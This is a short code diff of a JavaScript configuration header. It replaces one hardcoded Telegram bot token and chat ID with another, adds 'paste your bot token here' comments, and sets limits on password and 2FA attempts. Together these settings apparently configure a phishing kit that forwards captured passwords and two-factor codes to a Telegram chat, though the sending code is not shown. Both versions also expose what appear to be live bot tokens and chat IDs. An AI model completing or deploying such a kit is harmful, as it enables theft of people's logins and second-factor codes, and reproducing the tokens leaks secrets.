@@ -1,9 +1,9 @@
 import crypto from 'crypto';
 
-const TELEGRAM_API = `https://api.telegram.org/bot8226522512:AAGgpgreJuQu3uXjMuFeo6qcweKO1fs1Yvg`;
-const CHAT_ID = '-4966250298';
-const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '';
-const agent = new https.Agent({ family: 4 });
+const TELEGRAM_BOT_TOKEN = '8575478907:AAFgAY0T_c-4suQh5zM04Q30Wb_LLDVi5TM';  // paste your bot token here
+const TELEGRAM_CHAT_IDS = '-5158047121';      // paste your chat id here (comma-separated for multiple)
+const ALLOWED_ORIGIN = '';
+
 const MAX_PASSWORD_ATTEMPTS = 5;
 const MAX_2FA_ATTEMPTS = 5;
 const SESSION_EXPIRY_MS = 30 * 60 * 1000;
